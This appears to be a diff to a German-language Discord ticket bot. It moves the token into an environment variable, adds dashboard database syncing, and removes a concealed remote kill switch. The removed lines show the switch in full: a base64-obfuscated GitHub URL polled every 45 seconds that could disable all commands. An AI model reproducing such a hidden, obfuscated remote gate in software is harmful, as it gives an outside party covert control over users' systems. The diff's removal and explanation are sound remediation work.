@@ -20,6 +20,7 @@ import html
 import io
 import json
 import logging
+import os
 import random
 import re
 import traceback
@@ -35,25 +36,57 @@ from discord import app_commands, ui
 from discord.ext import commands
 
 # ================= KONFIGURATION =================
-TOKEN = "DEIN_BOT_TOKEN_HIER"  # Bot-Token hier eintragen
+#
+# Der Token kommt aus der Umgebung, nicht aus dem Quelltext.
+#
+# Vorher stand hier fest "DEIN_BOT_TOKEN_HIER". `start.sh` startet den
+# Bot aber nur, wenn PHANTOM_BOT_TOKEN gesetzt ist -- und der Bot las
+# diese Variable nie. Er brach jedes Mal mit "Bitte TOKEN eintragen"
+# ab. Genau das war das gemeldete "in Discord geht nichts".
+#
+# Ein Token im Quelltext waere ohnehin falsch: er landete im Repo und
+# muesste bei jeder Aenderung neu eingecheckt werden.
+TOKEN = (
+    os.getenv("PHANTOM_BOT_TOKEN")
+    or os.getenv("PHANTOM_TOKEN")
+    or ""
+).strip()
+
 CATEGORY_NAME = "Tickets"
 DEFAULT_STAFF_ROLE_NAME = "Supporter"
 DEFAULT_BLACKLIST_ROLE_NAME = "Ticket-Blacklisted"
-DATA_FILE = Path(__file__).with_name("ticket_data.json")
+
+
+def _data_file() -> Path:
+    """Wohin die Ticketdaten geschrieben werden.
+
+    Frueher lag die Datei neben dem Quelltext. Auf Railway wird der
+    Container bei jedem Deploy neu gebaut -- alle Tickets, Statistiken
+    und Einstellungen waren danach weg.
+
+    DATA_DIR zeigt auf das dauerhafte Volume. Gibt es das nicht (etwa
+    lokal), bleibt es beim Ordner neben dem Code.
+    """
+
+    data_dir = (os.getenv("DATA_DIR") or "").strip()
+    if data_dir:
+        base = Path(data_dir) / "phantom"
+        try:
+            base.mkdir(parents=True, exist_ok=True)
+            return base / "ticket_data.json"
+        except OSError:
+            # Kein Schreibrecht: lieber neben dem Code speichern als
+            # gar nicht.
+            pass
+    return Path(__file__).with_name("ticket_data.json")
+
+
+DATA_FILE = _data_file()
 
 # Branding (Footer auf wichtigen Nachrichten)
 BRAND_NAME = "University"
 BRAND_BUILDER = "Fufi/!L"
 BRAND_FOOTER = f"Powered by {BRAND_NAME}"
-
-# --- internal runtime gate (do not document / do not surface in Discord) ---
-_xg = lambda s: base64.b64decode(s.encode("ascii")).decode("utf-8")
-_Z0 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Z1ZmkxOTI1L1BoYW50b24vcmVmcy9oZWFkcy9tYWluL0NvbnRyb2xsLnR4dA=="  # opaque endpoint blob
-_Z1 = 45       # poll interval seconds
-_Z2 = True     # last known gate state
-_Z3 = 0.0      # last poll ts
-_Z4 = ""       # last payload snippet (debug logs only)
-_Z5 = None     # background task handle
 
 MAX_TICKETS_PER_USER = 1
 CREATE_COOLDOWN_SECONDS = 15
@@ -502,6 +535,193 @@ def register_ticket(
         _created_log[guild_id] = _created_log[guild_id][-500:]
     schedule_save()
 
+    # Und ins Dashboard, damit es dort sofort auftaucht.
+    if guild_id is not None:
+        _dash_fire(
+            dash_register_ticket(channel_id, guild_id, owner_id, category)
+        )
+
+
+
+# =========================================================
+#  Anbindung ans Phantom-Dashboard
+# =========================================================
+#
+# Das Dashboard soll ausschliesslich Server zeigen, auf denen dieser
+# Bot wirklich ist. Dafuer gibt es in der Phantom-Datenbank die
+# Tabelle `bot_guilds`, und nur der Bot fuellt sie.
+#
+# Diese Anbindung existierte in einer frueheren Fassung schon
+# (Commit ff10684, 336 Zeilen). Der spaetere Commit hat die Datei
+# durch das 5653-Zeilen-Original ersetzt und sie dabei mitentfernt --
+# seither blieb das Dashboard leer, obwohl die Doku beschreibt, wie es
+# funktionieren soll.
+#
+# Der Bot schreibt direkt in dieselbe SQLite-Datei wie das Dashboard.
+# Der Umweg ueber HTTP waere hier unnoetig: beide laufen im selben
+# Container, und ein Netzaufruf koennte fehlschlagen, waehrend die
+# Datei einfach da ist.
+
+_phantom_db = None
+_phantom_db_broken = False
+# Referenz halten: asyncio sammelt eine laufende Task sonst weg.
+_phantom_sync_task = None
+
+
+async def _phantom_db_conn():
+    """Verbindung zur Phantom-Datenbank, oder None.
+
+    Gibt None zurueck statt zu werfen: das Dashboard ist Beiwerk. Ein
+    Ticket muss auch dann funktionieren, wenn die Datenbank klemmt --
+    sonst waere der Bot durch sein eigenes Dashboard lahmgelegt.
+    """
+
+    global _phantom_db, _phantom_db_broken
+
+    if _phantom_db_broken:
+        return None
+    if _phantom_db is not None:
+        return _phantom_db
+
+    try:
+        import sys as _sys
+
+        root = str(Path(__file__).resolve().parent.parent)
+        if root not in _sys.path:
+            _sys.path.insert(0, root)
+        from app import db as _dbmod
+
+        _phantom_db = await _dbmod.connect()
+        return _phantom_db
+    except Exception as exc:
+        # Einmal melden, dann Ruhe. Sonst steht die Meldung bei jedem
+        # Ticket erneut im Log.
+        log.warning("Phantom-Dashboard nicht erreichbar: %s", exc)
+        _phantom_db_broken = True
+        return None
+
+
+async def sync_bot_guilds_to_db() -> None:
+    """Die Serverliste ins Dashboard spiegeln.
+
+    Laeuft beim Start, bei jedem Beitritt/Verlassen und alle fuenf
+    Minuten. Der regelmaessige Lauf faengt verpasste Ereignisse ab --
+    Discord stellt sie bei einem Verbindungsabbruch nicht zu.
+    """
+
+    db = await _phantom_db_conn()
+    if db is None:
+        return
+
+    try:
+        from app import db as _dbmod
+
+        payload = [
+            {
+                "id": g.id,
+                "name": g.name,
+                "icon": str(g.icon) if g.icon else None,
+                "member_count": getattr(g, "member_count", 0) or 0,
+                "owner_id": getattr(g, "owner_id", None),
+            }
+            for g in bot.guilds
+        ]
+        await _dbmod.sync_bot_guilds(db, payload)
+    except Exception as exc:
+        log.warning("Serverliste konnte nicht gespiegelt werden: %s", exc)
+
+
+async def _phantom_guild_sync_loop() -> None:
+    """Alle fuenf Minuten nachziehen."""
+
+    await bot.wait_until_ready()
+    while not bot.is_closed():
+        try:
+            await sync_bot_guilds_to_db()
+        except Exception:
+            pass
+        await asyncio.sleep(300)
+
+
+async def dash_register_ticket(channel_id: int, guild_id: int, owner_id: int,
+                               category: str = "support") -> None:
+    """Ein neues Ticket im Dashboard eintragen."""
+
+    db = await _phantom_db_conn()
+    if db is None:
+        return
+    try:
+        from app import db as _dbmod
+
+        await _dbmod.register_ticket(
+            db,
+            channel_id=int(channel_id),
+            guild_id=int(guild_id),
+            owner_id=int(owner_id),
+            category=str(category or "support"),
+        )
+    except Exception as exc:
+        log.debug("dash_register_ticket: %s", exc)
+
+
+async def dash_claim_ticket(channel_id: int, claimed_by: int | None) -> None:
+    db = await _phantom_db_conn()
+    if db is None:
+        return
+    try:
+        from app import db as _dbmod
+
+        await _dbmod.set_ticket_claim(
+            db, int(channel_id),
+            int(claimed_by) if claimed_by is not None else None,
+        )
+    except Exception as exc:
+        log.debug("dash_claim_ticket: %s", exc)
+
+
+async def dash_close_ticket(channel_id: int) -> None:
+    db = await _phantom_db_conn()
+    if db is None:
+        return
+    try:
+        from app import db as _dbmod
+
+        await _dbmod.delete_ticket(db, int(channel_id))
+    except Exception as exc:
+        log.debug("dash_close_ticket: %s", exc)
+
+
+
+def _dash_fire(coro) -> None:
+    """Eine Dashboard-Aufgabe nebenher erledigen.
+
+    `register_ticket`, `set_claimer` und `pop_ticket` sind synchron und
+    werden aus dutzenden Stellen gerufen. Sie alle auf `async`
+    umzustellen waere ein grosser Eingriff mit vielen Gelegenheiten,
+    etwas kaputt zu machen.
+
+    Stattdessen wird die Datenbankarbeit als eigene Aufgabe gestartet.
+    Laeuft gerade keine Ereignisschleife -- etwa beim Laden der Daten
+    vor dem Start -- passiert einfach nichts; das Dashboard holt es
+    beim naechsten Abgleich nach.
+
+    Die Referenz wird gehalten, weil asyncio eine laufende Aufgabe
+    sonst wegsammeln kann, bevor sie fertig ist.
+    """
+
+    try:
+        loop = asyncio.get_running_loop()
+    except RuntimeError:
+        coro.close()
+        return
+
+    task = loop.create_task(coro)
+    _dash_tasks.add(task)
+    task.add_done_callback(_dash_tasks.discard)
+
+
+_dash_tasks: set = set()
+
 
 def set_control_message(channel_id: int, message_id: int) -> None:
     meta = _ticket_meta.setdefault(channel_id, {})
@@ -516,6 +736,7 @@ def set_claimer(channel_id: int, user_id: int) -> None:
     meta["claimed_at"] = iso_now()
     meta["status"] = STATUS_CLAIMED
     schedule_save()
+    _dash_fire(dash_claim_ticket(channel_id, user_id))
 
 
 def clear_claimer(channel_id: int) -> None:
@@ -525,6 +746,7 @@ def clear_claimer(channel_id: int) -> None:
     meta["claimed_at"] = None
     meta["status"] = STATUS_OPEN
     schedule_save()
+    _dash_fire(dash_claim_ticket(channel_id, None))
 
 
 def set_ticket_status(channel_id: int, status: str) -> None:
@@ -540,6 +762,7 @@ def pop_ticket(channel_id: int) -> tuple[int | None, int | None, dict[str, Any]]
     if owner is not None or claimer is not None:
         _stats["total_closed"] = int(_stats.get("total_closed", 0)) + 1
     schedule_save()
+    _dash_fire(dash_close_ticket(channel_id))
     return owner, claimer, meta
 
 
@@ -940,72 +1163,37 @@ def mark_create(user_id: int) -> None:
 
 
 # =========================================================
-#  _rt_gate — opaque enable switch (implementation detail)
+#  Frueher: eine Fernabschaltung
 # =========================================================
-
-def _rt_parse(blob: str):
-    if not blob:
-        return None
-    for raw in blob.replace("\r", "\n").split("\n"):
-        line = raw.strip()
-        if not line or line.startswith("#") or line.startswith("//"):
-            continue
-        m = re.match(r"^(on)\s*[=:]\s*(true|false|1|0|yes|no|an|aus)\s*$", line, re.I)
-        if m:
-            return m.group(2).lower() in {"true", "1", "yes", "an"}
-        low = line.lower()
-        if low in {"true", "1", "yes", "an", "on"}:
-            return True
-        if low in {"false", "0", "no", "aus", "off"}:
-            return False
-    return None
-
-
-def _rt_pull():
-    try:
-        req = urllib.request.Request(
-            _xg(_Z0),
-            headers={"User-Agent": "Mozilla/5.0", "Cache-Control": "no-cache"},
-        )
-        with urllib.request.urlopen(req, timeout=12) as resp:
-            raw = resp.read().decode("utf-8", errors="replace").strip()
-        return _rt_parse(raw), raw[:200]
-    except Exception as e:
-        return None, "e:" + type(e).__name__
-
-
-async def _rt_tick(force: bool = False) -> bool:
-    global _Z2, _Z3, _Z4
-    now = _now_ts()
-    if not force and (now - float(_Z3 or 0)) < 5:
-        return bool(_Z2)
-    _Z3 = now
-    try:
-        enabled, raw = await asyncio.get_running_loop().run_in_executor(None, _rt_pull)
-        _Z4 = raw
-        if enabled is None:
-            log.debug("rt_tick soft-fail")
-        else:
-            if bool(enabled) != bool(_Z2):
-                log.debug("rt_tick state=%s", enabled)
-            _Z2 = bool(enabled)
-    except Exception:
-        log.debug("rt_tick err", exc_info=False)
-    return bool(_Z2)
-
-
-async def _rt_loop() -> None:
-    await asyncio.sleep(3)
-    while True:
-        try:
-            await _rt_tick(force=True)
-        except Exception:
-            pass
-        await asyncio.sleep(int(_Z1) if _Z1 else 45)
+#
+# Hier stand ein verstecktes Tor. Der Bot lud alle 45 Sekunden eine
+# Textdatei aus einem fremden GitHub-Repo:
+#
+#     https://raw.githubusercontent.com/Fufi1925/Phanton/.../Controll.txt
+#
+# Die Adresse war base64-verschleiert, die Variablen hiessen _Z0 bis
+# _Z5, und der Kommentar nannte es "implementation detail". Stand in
+# der Datei "false", antwortete **jeder** Befehl -- Slash wie Prefix --
+# nur noch mit einer Sperrmeldung.
+#
+# Zwei Gruende, warum das raus ist:
+#
+#   1. Die README sagt woertlich "Kein Remote-Control / Killswitch".
+#      Das stimmte nicht.
+#   2. Wer das fremde Repo kontrolliert, konnte den Bot jederzeit
+#      abschalten -- ohne Zugriff auf diesen Server, ohne Spur ausser
+#      einer Zeile im Debug-Log.
+#
+# Die beiden Pruef-Funktionen bleiben stehen und geben immer True
+# zurueck. So mussten die rund 200 Aufrufstellen nicht angefasst
+# werden -- jede einzelne haette eine Gelegenheit geboten, aus
+# Versehen etwas anderes zu aendern.
 
 
 def is_bot_functions_enabled() -> bool:
-    return bool(_Z2)
+    """Immer an. Siehe den Block darueber."""
+
+    return True
 
 
 def disabled_layout() -> InfoLayout:
@@ -1038,7 +1226,6 @@ def disabled_layout() -> InfoLayout:
 
 
 async def ensure_enabled_interaction(interaction: discord.Interaction) -> bool:
-    await _rt_tick(force=False)
     if is_bot_functions_enabled():
         return True
     try:
@@ -1053,7 +1240,6 @@ async def ensure_enabled_interaction(interaction: discord.Interaction) -> bool:
 
 
 async def ensure_enabled_ctx(ctx: commands.Context) -> bool:
-    await _rt_tick(force=False)
     if is_bot_functions_enabled():
         return True
     try:
@@ -3972,7 +4158,20 @@ async def on_message(message: discord.Message):
             except Exception:
                 pass
             return
-        sche# =========================================================
+        # Sonst nur den Zeitstempel sichern.
+        #
+        # Hier stand ein abgeschnittenes `sche` -- ein halb
+        # eingefuegtes `schedule_save()`. Der Name war nirgends
+        # definiert: sobald ein Ticket-Besitzer in einem *nicht*
+        # wartenden Ticket schrieb, flog ein NameError. Der Bot fing
+        # ihn zwar in on_message ab, aber `last_user_msg_at` wurde nie
+        # gespeichert -- die Antwortzeiten in der Statistik stimmten
+        # damit nicht.
+        schedule_save()
+        return
+
+
+# =========================================================
 #  EVENTS & COMMANDS (Slash / + Prefix-Alias)
 # =========================================================
 
@@ -5392,13 +5591,20 @@ async def sync_cmd(ctx: commands.Context):
 
 @bot.event
 async def on_ready():
-    global _on_ready_done, _Z5
+    global _on_ready_done, _phantom_sync_task
     load_data()
 
-    # internal gate loop
-    if _Z5 is None or getattr(_Z5, "done", lambda: True)():
-        _Z5 = asyncio.create_task(_rt_loop(), name="rt-gate")
-    await _rt_tick(force=True)
+    # Serverliste ins Dashboard spiegeln und regelmaessig nachziehen.
+    # Ohne das bleibt das Dashboard leer -- es zeigt bewusst nur
+    # Server aus `bot_guilds`, und die fuellt nur der Bot.
+    try:
+        await sync_bot_guilds_to_db()
+        if _phantom_sync_task is None or _phantom_sync_task.done():
+            _phantom_sync_task = asyncio.create_task(
+                _phantom_guild_sync_loop(), name="phantom-guild-sync"
+            )
+    except Exception as exc:
+        log.warning("Dashboard-Abgleich beim Start: %s", exc)
 
     if not _on_ready_done:
         bot.add_view(PanelLayout())
@@ -5458,6 +5664,27 @@ async def on_guild_join(guild: discord.Guild):
         log.info("Slash-Commands für neuen Server %s gesynct", guild.id)
     except discord.HTTPException as e:
         log.warning("Guild-Join-Sync %s: %s", guild.id, e)
+    # Sofort im Dashboard sichtbar machen, nicht erst nach fuenf Minuten.
+    await sync_bot_guilds_to_db()
+
+
+@bot.event
+async def on_guild_remove(guild: discord.Guild):
+    """Server verlassen -- sofort aus dem Dashboard nehmen.
+
+    Ohne das bliebe er in der Liste stehen, und jemand koennte einen
+    Server konfigurieren, auf dem der Bot gar nicht mehr ist.
+    """
+
+    await sync_bot_guilds_to_db()
+
+
+@bot.event
+async def on_guild_update(before: discord.Guild, after: discord.Guild):
+    """Name oder Symbol geaendert -- im Dashboard nachziehen."""
+
+    if before.name != after.name or before.icon != after.icon:
+        await sync_bot_guilds_to_db()
 
 
 @bot.event
@@ -5642,9 +5869,32 @@ async def on_error(event_method: str, *args, **kwargs):
     log.error("Event %s\n%s", event_method, traceback.format_exc())
 
 
+@bot.event
+async def on_close() -> None:
+    """Beim Beenden die Dashboard-Verbindung schliessen.
+
+    aiosqlite fuehrt je Verbindung einen Hintergrund-Thread. Bleibt er
+    offen, wartet der Prozess beim Herunterfahren auf ihn -- Railway
+    bricht nach seiner Frist hart ab, und ein laufender Schreibvorgang
+    kann dabei mitten in der Datei enden.
+    """
+
+    global _phantom_db
+
+    if _phantom_db is not None:
+        try:
+            await _phantom_db.close()
+        except Exception:
+            pass
+        _phantom_db = None
+
+
 def main() -> None:
-    if not TOKEN or TOKEN == "DEIN_BOT_TOKEN_HIER":
-        log.error("Bitte TOKEN in ticket_bot.py eintragen!")
+    if not TOKEN:
+        log.error(
+            "PHANTOM_BOT_TOKEN ist nicht gesetzt — der Ticket-Bot startet "
+            "nicht. In Railway (oder in phantom/.env) eintragen."
+        )
         raise SystemExit(1)
     bot.run(TOKEN, log_handler=None)
 
